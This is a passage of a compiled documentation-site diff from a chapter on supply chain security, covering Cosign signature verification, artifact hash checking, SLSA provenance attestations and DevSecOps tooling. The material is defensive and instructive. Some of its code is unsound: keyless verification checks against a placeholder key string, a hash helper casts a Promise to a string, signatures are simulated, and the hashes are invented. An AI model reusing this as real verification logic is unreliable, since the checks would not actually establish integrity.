}\n\n  /**\n   * Perform keyless verification using Fulcio + Rekor.\n   */\n  async verifyKeyless(\n    imageRef: string,\n    expectedIdentity?: string,\n    expectedIssuer?: string\n  ): Promise<VerificationResult> {\n    const errors: string[] = [];\n\n    // Step 1: Fetch the signature\n    const signature = await this.fetchSignature(imageRef);\n    if (!signature) {\n      errors.push('No signature found for image');\n      return { imageRef, verified: false, method: 'keyless', signature: {} as SignatureMetadata, errors, timestamp: new Date().toISOString() };\n    }\n\n    // Step 2: Verify the certificate\n    if (!signature.certificate) {\n      errors.push('No certificate attached to signature');\n    } else {\n      const certInfo = this.cryptoUtils.parseCertificate(signature.certificate);\n      if (!certInfo.isValid) {\n        errors.push('Certificate is not valid');\n      }\n      if (certInfo.notAfter < new Date()) {\n        errors.push('Certificate has expired');\n      }\n      if (expectedIdentity && certInfo.subject !== expectedIdentity) {\n        errors.push(`Certificate subject \"${certInfo.subject}\" does not match expected identity \"${expectedIdentity}\"`);\n      }\n      if (expectedIssuer && certInfo.issuer !== expectedIssuer) {\n        errors.push(`Certificate issuer \"${certInfo.issuer}\" does not match expected issuer \"${expectedIssuer}\"`);\n      }\n    }\n\n    // Step 3: Verify Rekor transparency log inclusion\n    if (signature.rekorEntry) {\n      const inclusionVerified = await this.rekor.verifyInclusion(signature.rekorEntry);\n      if (!inclusionVerified) {\n        errors.push('Rekor inclusion verification failed');\n      }\n    }\n\n    // Step 4: Verify the signature against the payload\n    const sigVerified = await this.cryptoUtils.verifySignature(\n      signature.signaturePayload,\n      signature.signatureDigest,\n      'public-key-pem',\n      'ECDSA-P256'\n    );\n\n    if (!sigVerified) {\n      errors.push('Signature verification failed');\n    }\n\n    return {\n      imageRef,\n      verified: errors.length === 0,\n      method: 'keyless',\n      signature,\n      errors,\n      timestamp: new Date().toISOString(),\n    };\n  }\n\n  /**\n   * Perform key-based verification using a provided public key.\n   */\n  async verifyWithKey(\n    imageRef: string,\n    publicKeyPEM: string\n  ): Promise<VerificationResult> {\n    const errors: string[] = [];\n\n    const signature = await this.fetchSignature(imageRef);\n    if (!signature) {\n      errors.push('No signature found for image');\n      return { imageRef, verified: false, method: 'key', signature: {} as SignatureMetadata, errors, timestamp: new Date().toISOString() };\n    }\n\n    const sigVerified = await this.cryptoUtils.verifySignature(\n      signature.signaturePayload,\n      signature.signatureDigest,\n      publicKeyPEM,\n      'ECDSA-P256'\n    );\n\n    if (!sigVerified) {\n      errors.push('Signature does not match public key');\n    }\n\n    return {\n      imageRef,\n      verified: errors.length === 0,\n      method: 'key',\n      signature,\n      errors,\n      timestamp: new Date().toISOString(),\n    };\n  }\n}\n\n// ─── Demonstration ───\n\nasync function demonstrateCosignVerification(): Promise<void> {\n  const verifier = new CosignVerifier();\n\n  console.log('=== Cosign Keyless Verification ===');\n  const result = await verifier.verifyKeyless(\n    'registry.example.com/app:latest',\n    'developer@example.com',\n    'https://accounts.google.com'\n  );\n\n  console.log(`Image: ${result.imageRef}`);\n  console.log(`Verified: ${result.verified}`);\n  console.log(`Method: ${result.method}`);\n  console.log(`Errors: ${result.errors.length > 0 ? result.errors.join(', ') : 'None'}`);\n\n  if (result.verified) {\n    console.log('✓ Signature is valid and trusted');\n  }\n}\n\nvoid demonstrateCosignVerification();\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1662-software-artifact-hash-verifier-typescript",
+      children: "16.6.2 Software Artifact Hash Verifier (TypeScript)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "/**\n * Software Artifact Hash Verifier\n *\n * Verifies the integrity of downloaded artifacts by comparing\n * their cryptographic hashes against known-good values.\n */\n\nimport * as fs from 'fs';\nimport { createHash } from 'crypto';\n\n/* ─── Type Definitions ─── */\n\ntype HashAlgorithm = 'sha256' | 'sha512' | 'sha1' | 'md5';\n\ninterface ArtifactHash {\n  algorithm: HashAlgorithm;\n  value: string;\n}\n\ninterface ArtifactVerificationRequest {\n  filePath: string;\n  expectedHashes: ArtifactHash[];\n  expectedSizeBytes?: number;\n  artifactName?: string;\n}\n\ninterface ArtifactVerificationResult {\n  artifactName: string;\n  filePath: string;\n  verified: boolean;\n  checks: Array<{\n    type: 'hash' | 'size';\n    algorithm?: HashAlgorithm;\n    expected: string;\n    actual: string;\n    match: boolean;\n  }>;\n  errors: string[];\n}\n\n/* ─── Artifact Verifier ─── */\n\nclass ArtifactHashVerifier {\n  private readonly SUPPORTED_ALGORITHMS: HashAlgorithm[] = ['sha256', 'sha512', 'sha1', 'md5'];\n\n  /**\n   * Compute the hash of a file using the specified algorithm.\n   */\n  private computeHash(filePath: string, algorithm: HashAlgorithm): string {\n    const hash = createHash(algorithm);\n    const stream = fs.createReadStream(filePath);\n\n    return new Promise<string>((resolve, reject) => {\n      stream.on('data', (chunk: Buffer) => hash.update(chunk));\n      stream.on('end', () => resolve(hash.digest('hex')));\n      stream.on('error', (err: Error) => reject(err));\n    }) as unknown as string;\n  }\n\n  /**\n   * Synchronous version for simpler usage.\n   */\n  private computeHashSync(filePath: string, algorithm: HashAlgorithm): string {\n    const content = fs.readFileSync(filePath);\n    return createHash(algorithm).update(content).digest('hex');\n  }\n\n  /**\n   * Verify an artifact against expected hashes.\n   */\n  verify(request: ArtifactVerificationRequest): ArtifactVerificationResult {\n    const errors: string[] = [];\n    const checks: ArtifactVerificationResult['checks'] = [];\n\n    const artifactName = request.artifactName ?? request.filePath.split(/[/\\\\]/).pop() ?? 'unknown';\n\n    // Check file existence\n    if (!fs.existsSync(request.filePath)) {\n      errors.push(`File not found: ${request.filePath}`);\n      return {\n        artifactName,\n        filePath: request.filePath,\n        verified: false,\n        checks,\n        errors,\n      };\n    }\n\n    const stats = fs.statSync(request.filePath);\n\n    // Verify file size if specified\n    if (request.expectedSizeBytes !== undefined) {\n      const sizeMatch = stats.size === request.expectedSizeBytes;\n      checks.push({\n        type: 'size',\n        expected: `${request.expectedSizeBytes} bytes`,\n        actual: `${stats.size} bytes`,\n        match: sizeMatch,\n      });\n      if (!sizeMatch) {\n        errors.push(\n          `Size mismatch: expected ${request.expectedSizeBytes} bytes, got ${stats.size} bytes`\n        );\n      }\n    }\n\n    // Verify each hash\n    for (const expectedHash of request.expectedHashes) {\n      if (!this.SUPPORTED_ALGORITHMS.includes(expectedHash.algorithm)) {\n        errors.push(`Unsupported hash algorithm: ${expectedHash.algorithm}`);\n        continue;\n      }\n\n      const computedHash = this.computeHashSync(request.filePath, expectedHash.algorithm);\n      const hashMatch = computedHash === expectedHash.value.toLowerCase();\n\n      checks.push({\n        type: 'hash',\n        algorithm: expectedHash.algorithm,\n        expected: expectedHash.value,\n        actual: computedHash,\n        match: hashMatch,\n      });\n\n      if (!hashMatch) {\n        errors.push(\n          `${expectedHash.algorithm.toUpperCase()} hash mismatch: ` +\n          `expected \"${expectedHash.value}\", computed \"${computedHash}\"`\n        );\n      }\n    }\n\n    return {\n      artifactName,\n      filePath: request.filePath,\n      verified: errors.length === 0,\n      checks,\n      errors,\n    };\n  }\n\n  /**\n   * Verify an artifact by downloading expected hashes from a trusted source.\n   * In production, this would fetch from a transparency log or checksum file.\n   */\n  async verifyFromChecksumFile(\n    artifactPath: string,\n    checksumPath: string,\n    algorithm: HashAlgorithm = 'sha256'\n  ): Promise<ArtifactVerificationResult> {\n    // Parse checksum file (format: <hash>  <filename>)\n    const checksumContent = fs.readFileSync(checksumPath, 'utf-8');\n    const artifactName = artifactPath.split(/[/\\\\]/).pop() ?? '';\n\n    const line = checksumContent\n      .split('\\n')\n      .find((l) => l.trim().endsWith(artifactName));\n\n    if (!line) {\n      return {\n        artifactName,\n        filePath: artifactPath,\n        verified: false,\n        checks: [],\n        errors: [`No checksum entry found for \"${artifactName}\" in \"${checksumPath}\"`],\n      };\n    }\n\n    const parts = line.trim().split(/\\s+/);\n    if (parts.length < 2) {\n      return {\n        artifactName,\n        filePath: artifactPath,\n        verified: false,\n        checks: [],\n        errors: [`Invalid checksum format in line: \"${line}\"`],\n      };\n    }\n\n    const expectedHash = parts[0];\n\n    return this.verify({\n      filePath: artifactPath,\n      expectedHashes: [{ algorithm, value: expectedHash }],\n      artifactName,\n    });\n  }\n}\n\n// ─── Demonstration ───\n\nfunction demonstrateArtifactVerification(): void {\n  const verifier = new ArtifactHashVerifier();\n\n  // Simulate — in real usage, would be an actual file\n  const testFilePath = './dist/app-bundle.js';\n  \n  // Create a test file for demonstration\n  fs.writeFileSync(testFilePath, 'console.log(\"Hello, World!\");');\n\n  const result = verifier.verify({\n    filePath: testFilePath,\n    expectedHashes: [\n      { algorithm: 'sha256', value: '6a8a560a6b8f6e7e6c8d9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0' },\n      { algorithm: 'sha512', value: '0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c' },\n    ],\n    expectedSizeBytes: 38,\n    artifactName: 'app-bundle.js',\n  });\n\n  console.log('=== Artifact Verification ===');\n  console.log(`Artifact: ${result.artifactName}`);\n  console.log(`Verified: ${result.verified}`);\n  console.log(`Checks:`);\n  for (const check of result.checks) {\n    const icon = check.match ? '✓' : '✗';\n    console.log(`  ${icon} ${check.type === 'hash' ? check.algorithm?.toUpperCase() : 'SIZE'}: ${check.expected}`);\n    console.log(`    Expected: ${check.expected}`);\n    console.log(`    Actual:   ${check.actual}`);\n  }\n  if (result.errors.length > 0) {\n    console.log(`Errors: ${result.errors.join('; ')}`);\n  }\n\n  // Cleanup\n  // fs.unlinkSync(testFilePath);\n}\n\ndemonstrateArtifactVerification();\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "167-slsa--supply-chain-levels-for-software-artifacts",
+      children: "16.7 SLSA — Supply Chain Levels for Software Artifacts"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "SLSA (pronounced \"salsa\") is a security framework from Google that specifies a graduated set of security levels for software supply chain integrity."
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1671-slsa-levels",
+      children: "16.7.1 SLSA Levels"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-mermaid",
+        children: "flowchart TB\n    subgraph SLSA_L0[\"SLSA L0 — No guarantees\"]\n        A0[Any build process]\n        A0 -->|No provenance| A0e[No security guarantees]\n    end\n\n    subgraph SLSA_L1[\"SLSA L1 — Basic provenance\"]\n        B1[Build process]\n        B1 -->|Provenance generated| P1[Provenance: who, what, when]\n        P1 -->|Not verified| B1e[Minimal protection]\n    end\n\n    subgraph SLSA_L2[\"SLSA L2 — Tamper resistance\"]\n        C2[Hosted build platform]\n        C2 -->|Signed provenance| P2[Provenance: signed by platform]\n        P2 -->|Isolated builds| C2e[Resistant to tampering]\n    end\n\n    subgraph SLSA_L3[\"SLSA L3 — Hardened builds\"]\n        D3[Hardened build platform]\n        D3 -->|No user-defined steps| P3[Provenance: full dependency tree]\n        P3 -->|Hermetic + Reproducible| D3e[Maximum integrity]\n    end\n\n    subgraph SLSA_L4[\"SLSA L4 — Maximum security\"]\n        E4[Two-person review]\n        E4 -->|All of L3 + audits| P4[Provenance: peer-reviewed]\n        P4 -->|Security audit + FIPS| E4e[Highest assurance]\n    end\n\n    SLSA_L0 --> SLSA_L1\n    SLSA_L1 --> SLSA_L2\n    SLSA_L2 --> SLSA_L3\n    SLSA_L3 --> SLSA_L4\n"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Figure 16.3"
+      }), ": SLSA maturity model showing progressive security guarantees from L0 to L4."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1672-slsa-requirements-summary",
+      children: "16.7.2 SLSA Requirements Summary"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Requirement"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "L1"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "L2"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "L3"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "L4"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Provenance exists"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Provenance is authenticated"
+          }), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Provenance is non-forgeable"
+          }), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Build service is hosted"
+          }), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Build is isolated"
+          }), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Build is hermetic"
+          }), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Build is reproducible"
+          }), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Dependencies are enumerated"
+          }), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Two-person review"
+          }), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Security audit"
+          }), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {}), (0,jsx_runtime.jsx)(_components.td, {
+            children: "✓"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1673-slsa-provenance-attestation-builder-typescript",
+      children: "16.7.3 SLSA Provenance Attestation Builder (TypeScript)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "/**\n * SLSA Provenance Attestation Builder\n *\n * Generates in-toto attestations that conform to the SLSA\n * provenance predicate format (v1).\n *\n * Reference: https://slsa.dev/provenance/v1\n */\n\n/* ─── Type Definitions ─── */\n\ninterface SLSAProvenanceV1 {\n  type: 'https://slsa.dev/provenance/v1';\n  predicateType: 'https://slsa.dev/provenance/v1';\n  subject: Array<{\n    name: string;\n    digest: Record<string, string>;\n  }>;\n  predicate: {\n    buildDefinition: {\n      buildType: string;\n      externalParameters: Record<string, unknown>;\n      internalParameters: Record<string, unknown>;\n      resolvedDependencies: Array<{\n        uri: string;\n        digest: Record<string, string>;\n      }>;\n    };\n    runDetails: {\n      builder: {\n        id: string;\n      };\n      metadata: {\n        invocationId?: string;\n        startedOn: string;\n        finishedOn: string;\n      };\n      byproducts?: Array<{\n        name: string;\n        digest?: Record<string, string>;\n      }>;\n    };\n  };\n}\n\ninterface SLSAConfig {\n  level: 0 | 1 | 2 | 3 | 4;\n  builderID: string;\n  buildType: string;\n  repositoryURI: string;\n  commitSHA: string;\n  buildCommand: string;\n  artifacts: Array<{\n    name: string;\n    sha256: string;\n  }>;\n  dependencies: Array<{\n    uri: string;\n    sha256?: string;\n  }>;\n}\n\n/* ─── Provenance Builder ─── */\n\nclass SLSAProvenanceBuilder {\n  /**\n   * Generate an in-toto statement with SLSA provenance predicate.\n   */\n  build(config: SLSAConfig): SLSAProvenanceV1 {\n    const startedOn = new Date(Date.now() - 120000); // 2 minutes ago\n    const finishedOn = new Date();\n\n    const subjects = config.artifacts.map((artifact) => ({\n      name: artifact.name,\n      digest: { sha256: artifact.sha256 },\n    }));\n\n    const resolvedDependencies = config.dependencies.map((dep) => ({\n      uri: dep.uri,\n      ...(dep.sha256 ? { digest: { sha256: dep.sha256 } } : {}),\n    }));\n\n    // Add the source repository as a dependency\n    resolvedDependencies.push({\n      uri: config.repositoryURI,\n      digest: { sha1: config.commitSHA },\n    });\n\n    const attestation: SLSAProvenanceV1 = {\n      type: 'https://slsa.dev/provenance/v1',\n      predicateType: 'https://slsa.dev/provenance/v1',\n      subject: subjects,\n      predicate: {\n        buildDefinition: {\n          buildType: config.buildType,\n          externalParameters: {\n            repository: config.repositoryURI,\n            commit: config.commitSHA,\n            command: config.buildCommand,\n          },\n          internalParameters: {},\n          resolvedDependencies,\n        },\n        runDetails: {\n          builder: {\n            id: config.builderID,\n          },\n          metadata: {\n            invocationId: `build-${Date.now()}`,\n            startedOn: startedOn.toISOString(),\n            finishedOn: finishedOn.toISOString(),\n          },\n        },\n      },\n    };\n\n    // Add level-appropriate extensions\n    if (config.level >= 2) {\n      // L2+: Builder identity is authenticated (e.g., OIDC)\n      attestation.predicate.runDetails.builder.id = \n        `${config.builderID}@${finishedOn.toISOString()}`;\n    }\n\n    if (config.level >= 3) {\n      // L3+: Hermetic build — enumerate all dependencies\n      attestation.predicate.buildDefinition.internalParameters = {\n        hermetic: true,\n        isolated: true,\n      };\n    }\n\n    if (config.level >= 4) {\n      // L4+: Two-person review — include review metadata\n      attestation.predicate.buildDefinition.internalParameters = {\n        ...attestation.predicate.buildDefinition.internalParameters,\n        twoPersonReview: true,\n        reproducible: true,\n      };\n      attestation.predicate.runDetails.byproducts = [\n        {\n          name: 'build-log',\n          digest: { sha256: '0000000000000000000000000000000000000000000000000000000000000000' },\n        },\n      ];\n    }\n\n    return attestation;\n  }\n\n  /**\n   * Sign the attestation (simulated DSSE signature envelope).\n   * In production, use `dsse` library or Sigstore client.\n   */\n  sign(\n    attestation: SLSAProvenanceV1,\n    signerPrivateKeyPEM: string,\n    keyID: string\n  ): {\n    payload: string;\n    payloadType: string;\n    signatures: Array<{\n      sig: string;\n      keyid: string;\n    }>;\n  } {\n    const payload = JSON.stringify(attestation);\n    const payloadBase64 = Buffer.from(payload).toString('base64');\n\n    return {\n      payload: payloadBase64,\n      payloadType: 'application/vnd.in-toto+json',\n      signatures: [\n        {\n          sig: 'simulated-signature-hex-value', // Real: crypto.sign('sha256', Buffer.from(payload), signerPrivateKeyPEM)\n          keyid: keyID,\n        },\n      ],\n    };\n  }\n\n  /**\n   * Verify the SLSA level requirements.\n   */\n  verifyLevelRequirements(config: SLSAConfig): string[] {\n    const violations: string[] = [];\n\n    if (config.level >= 1) {\n      if (config.artifacts.length === 0) {\n        violations.push('L1: At least one artifact must be specified');\n      }\n      if (!config.commitSHA) {\n        violations.push('L1: Source commit SHA is required for provenance');\n      }\n    }\n\n    if (config.level >= 2) {\n      if (!config.builderID) {\n        violations.push('L2: Builder ID must be authenticated');\n      }\n      if (!config.buildType) {\n        violations.push('L2: Build type must be specified');\n      }\n    }\n\n    if (config.level >= 3) {\n      if (config.dependencies.length === 0) {\n        violations.push('L3: All dependencies must be enumerated');\n      }\n      const missingHashes = config.dependencies.filter((d) => !d.sha256);\n      if (missingHashes.length > 0) {\n        violations.push(\n          `L3: Dependencies must include hashes: ${missingHashes.map((d) => d.uri).join(', ')}`\n        );\n      }\n    }\n\n    if (config.level >= 4) {\n      violations.push('L4: Requires two-person review (verify via external audit trail)');\n      violations.push('L4: Requires security audit documentation');\n    }\n\n    return violations;\n  }\n}\n\n// ─── Demonstration ───\n\nfunction demonstrateSLSABuilder(): void {\n  const builder = new SLSAProvenanceBuilder();\n\n  const config: SLSAConfig = {\n    level: 3,\n    builderID: 'https://github.com/actions/github-actions',\n    buildType: 'https://github.com/actions/build/v1',\n    repositoryURI: 'git+https://github.com/org/app.git',\n    commitSHA: 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0',\n    buildCommand: 'npm ci && npm run build && docker build -t app .',\n    artifacts: [\n      {\n        name: 'app:latest',\n        sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',\n      },\n      {\n        name: 'app-bundle.js',\n        sha256: '6a8a560a6b8f6e7e6c8d9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0',\n      },\n    ],\n    dependencies: [\n      {\n        uri: 'npm://lodash@4.17.21',\n        sha256: 'c3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3',\n      },\n      {\n        uri: 'npm://express@4.18.2',\n        sha256: 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e',\n      },\n    ],\n  };\n\n  console.log('=== SLSA Provenance Attestation ===');\n  console.log(`Target Level: SLSA L${config.level}`);\n\n  // Check requirements\n  const violations = builder.verifyLevelRequirements(config);\n  if (violations.length > 0) {\n    console.log('\\nRequirement Violations:');\n    violations.forEach((v) => console.log(`  ✗ ${v}`));\n  } else {\n    console.log('✓ All requirements met');\n  }\n\n  // Generate attestation\n  const attestation = builder.build(config);\n  console.log('\\nAttestation (SLSA L3):');\n  console.log(JSON.stringify(attestation, null, 2));\n  \n  // Sign it\n  const signedEnvelope = builder.sign(attestation, 'private-key-pem', 'key-001');\n  console.log('\\nSigned DSSE Envelope:');\n  console.log(JSON.stringify(signedEnvelope, null, 2));\n}\n\ndemonstrateSLSABuilder();\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "168-devsecops-integration",
+      children: "16.8 DevSecOps Integration"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "DevSecOps integrates security practices into DevOps pipelines, making security a shared responsibility throughout the software development lifecycle."
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1681-security-tools-integration",
+      children: "16.8.1 Security Tools Integration"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-mermaid",
+        children: "flowchart LR\n    subgraph DevSecOps[\"DevSecOps Toolchain\"]\n        direction TB\n        SAST[SAST: CodeQL, Semgrep, SonarQube]\n        SCA[SCA: Snyk, OWASP DC, Trivy]\n        Secrets[Secrets: TruffleHog, Gitleaks]\n        Container[Container: Trivy, Grype, Clair]\n        DAST[DAST: ZAP, Burp Suite]\n        Fuzzing[Fuzzing: OSS-Fuzz, LibFuzzer]\n    end\n\n    subgraph Stages[\"Pipeline Stages\"]\n        Commit[Commit]\n        Build[Build]\n        Test[Test]\n        Staging[Staging]\n        Production[Production]\n    end\n\n    Commit --> SAST\n    Commit --> Secrets\n    Build --> SCA\n    Build --> Container\n    Test --> DAST\n    Test --> Fuzzing\n    Staging --> DAST\n    Production --> Monitoring[Runtime Monitoring]\n\n    SAST -->|Fail build| Build\n    Secrets -->|Fail commit| Commit\n    SCA -->|Fail build| Build\n    Container -->|Fail deploy| Staging\n    DAST -->|Fail promotion| Production\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1682-devsecops-integration-checklist",
+      children: "16.8.2 DevSecOps Integration Checklist"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Stage"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Tool"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Action"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "When"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "Pre-commit"
+            })
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.code, {
+              children: "gitleaks"
+            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
+              children: "trufflehog"
+            })]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Scan for secrets"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "git hook"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "Pre-commit"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.code, {
+              children: "eslint-plugin-security"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Detect insecure patterns"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "git hook"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "PR Check"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "CodeQL, Semgrep"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SAST scan"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Pull request"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "PR Check"
+            })
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.code, {
+              children: "npm audit"
+            }), ", ", (0,jsx_runtime.jsx)(_components.code, {
+              children: "snyk"
+            })]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Dependency scan"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Pull request"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "Build"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Syft, CycloneDX"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SBOM generation"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Every build"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
